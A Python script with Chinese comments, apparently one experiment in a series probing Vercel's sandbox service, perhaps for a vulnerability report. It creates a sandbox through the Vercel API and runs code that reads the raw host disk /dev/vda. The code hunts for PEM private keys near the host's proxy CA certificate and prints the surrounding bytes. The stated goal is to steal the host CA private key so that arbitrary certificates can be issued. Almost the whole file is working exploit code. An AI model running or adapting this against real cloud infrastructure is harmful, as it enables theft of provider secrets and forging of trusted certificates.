# 实验J122: 宿主盘全盘扫描 — 定位 PEM 私钥 (ca-key.pem 候选) 与 ca-cert.pem 上下文
# 动机: j121 mountinfo 泄露宿主文件 /run/cell/ca-cert.pem(254:0); CA 私钥大概率同目录/同盘
#       若可读宿主 CA 私钥 => 报告1从"任意文件读写"升级为"宿主CA私钥泄露(可签发任意证书)"
# 读不受 page cache 影响(绕过文件系统直接读盘), 无写操作, 零破坏风险
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=600):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj122"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c, flush=True)
if c != 200:
    print(r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

SCAN = r"""
import os, hashlib, time
t0 = time.time()

# [1] 先读沙箱内可见的宿主 ca-cert.pem (bind mount) 内容, 用作盘上定位锚点
anchors = []
for p in ["/etc/pki/ca-trust/source/anchors/vercel-proxy-ca.pem",
          "/usr/local/share/ca-certificates/vercel-proxy-ca.crt"]:
    try:
        d = open(p, "rb").read()
        print("ANCHOR %s: %d bytes, sha256=%s" % (p, len(d), hashlib.sha256(d).hexdigest()[:16]), flush=True)
        print("  HEAD: %r" % d[:120], flush=True)
        anchors.append(d)
    except Exception as e:
        print("ANCHOR FAIL %s: %s" % (p, e), flush=True)

# [2] 全盘扫描: PEM 私钥特征 + ca-cert 锚点
FEATS = [b"-----BEGIN PRIVATE KEY-----", b"-----BEGIN RSA PRIVATE KEY-----",
         b"-----BEGIN EC PRIVATE KEY-----", b"-----BEGIN ENCRYPTED PRIVATE KEY-----"]
hits = []
anchor_hits = []
BS = 4 * 1024 * 1024  # 4MB 块
f = open("/dev/vda", "rb", buffering=0)
total = 0
try:
    while True:
        chunk = f.read(BS)
        if not chunk:
            break
        total += len(chunk)
        base = total - len(chunk)
        for feat in FEATS:
            i = chunk.find(feat)
            if i >= 0:
                hits.append((base + i, feat.decode()))
        for j, a in enumerate(anchors):
            if not a:
                continue
            i = chunk.find(a[:256])
            if i >= 0:
                anchor_hits.append((base + i, j))
        if total % (8 * BS) == 0:
            print("  scanned %.1f GB (%.0fs)" % (total / 2**30, time.time() - t0), flush=True)
finally:
    f.close()
print("SCANNED %.2f GB in %.0fs" % (total / 2**30, time.time() - t0), flush=True)
print("KEY_HITS:", hits, flush=True)
print("ANCHOR_HITS:", anchor_hits, flush=True)

# [3] 对每个私钥命中: 读上下文 4KB, 输出指纹
for off, name in hits:
    print("\n== KEY HIT @ %d (%s) ==" % (off, name), flush=True)
    f = open("/dev/vda", "rb", buffering=0)
    f.seek(max(0, off - 512))
    ctx = f.read(4096)
    f.close()
    h = hashlib.sha256(ctx).hexdigest()
    print("CTX_SHA256:", h, flush=True)
    print("CTX_HEAD: %r" % ctx[:400], flush=True)
    print("CTX_TAIL: %r" % ctx[-200:], flush=True)

# [4] 对锚点命中: 读上下文看同区是否有私钥相邻
for off, j in anchor_hits:
    print("\n== ANCHOR HIT @ %d (anchor[%d]) ==" % (off, j), flush=True)
    f = open("/dev/vda", "rb", buffering=0)
    f.seek(max(0, off - 4096))
    ctx = f.read(8192 + len(anchors[j]) + 8192)
    f.close()
    print("CTX_LEN:", len(ctx), flush=True)
    for feat in FEATS:
        i = ctx.find(feat)
        print("  nearby %s @ %d" % (feat, i), flush=True)
print("\nSCAN_DONE", flush=True)
"""
run_cmd(sid, SCAN, "scan-vda")

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
